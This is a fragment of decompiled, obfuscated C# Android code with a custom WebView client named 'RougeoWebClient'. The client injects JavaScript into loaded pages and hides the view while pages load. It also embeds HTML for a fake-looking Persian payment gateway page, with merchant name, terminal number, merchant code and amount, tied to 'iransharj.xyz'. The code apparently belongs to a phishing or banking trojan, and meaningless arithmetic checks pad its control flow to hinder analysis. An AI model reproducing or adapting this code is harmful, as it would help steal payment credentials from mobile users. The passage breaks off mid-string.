object[]\n								{\n									new Random().Next(1111111, 9999999),\n									new Random().Next(1111, 9999),\n									\"فروش اينترنتي شارژ\",\n									\"2138873\",\n									\"iransharj.xyz\",\n									new Random().Next(111111, 999999)\n								});\n								if (261771 - 396930 != -135159)\n								{\n									continue;\n								}\n							}\n						}\n						if (!string.IsNullOrEmpty(text))\n						{\n							if (155372 - 215715 == -60342)\n							{\n								continue;\n							}\n							view.LoadUrl(\"javascript: {\" + text + \"};\");\n							if (117199 - 181055 == -63855)\n							{\n								continue;\n							}\n						}\n						view.Visibility = ViewStates.Visible;\n						if (39650 - 188023 != -148372)\n						{\n							this.isfinished = true;\n							if (54964 - 377987 != -323022)\n							{\n								break;\n							}\n						}\n					}\n				}\n			}\n		}\n\n		public override bool ShouldOverrideUrlLoading(WebView view, string url)\n		{\n			return false;\n		}\n\n		public override void OnPageStarted(WebView view, string url, Bitmap favicon)\n		{\n			view.Visibility = ViewStates.Gone;\n		}\n\n		public override void OnReceivedError(WebView view, [GeneratedEnum] ClientError errorCode, string description, string failingUrl)\n		{\n			this.iserror = true;\n		}\n\n		public RougeoWebClient()\n		{\n			if (171780 - 531627 != -359847)\n			{\n			}\n			while (true)\n			{\n				this.geturl = \"\";\n				if (49026 - 48265 != 762)\n				{\n					this.sclass1 = \"&lt;p&gt;&lt;span class=\'glyphicon glyphicon-stop\' aria-hidden=\'true\'&gt;&lt;/span&gt;پذیرنده : اي ار چارز&lt;/p&gt;&lt;p&gt;&lt;span class=\'glyphicon glyphicon-stop\' aria-hidden=\'true\'&gt;&lt;/span&gt;شماره پایانه : 02006268&lt;/p&gt;&lt;p&gt;&lt;span class=\'glyphicon glyphicon-stop\' aria-hidden=\'true\'&gt;&lt;/span&gt;کد پذیرندگی : 992180002006268&lt;/p&gt;&lt;p&gt;&lt;span class=\'glyphicon glyphicon-stop\' aria-hidden=\'true\'&gt;&lt;/span&gt;  مبلغ قابل پرداخت :&lt;span style=\'font-weight: 800; margin: 0 5px; color: #0F4DB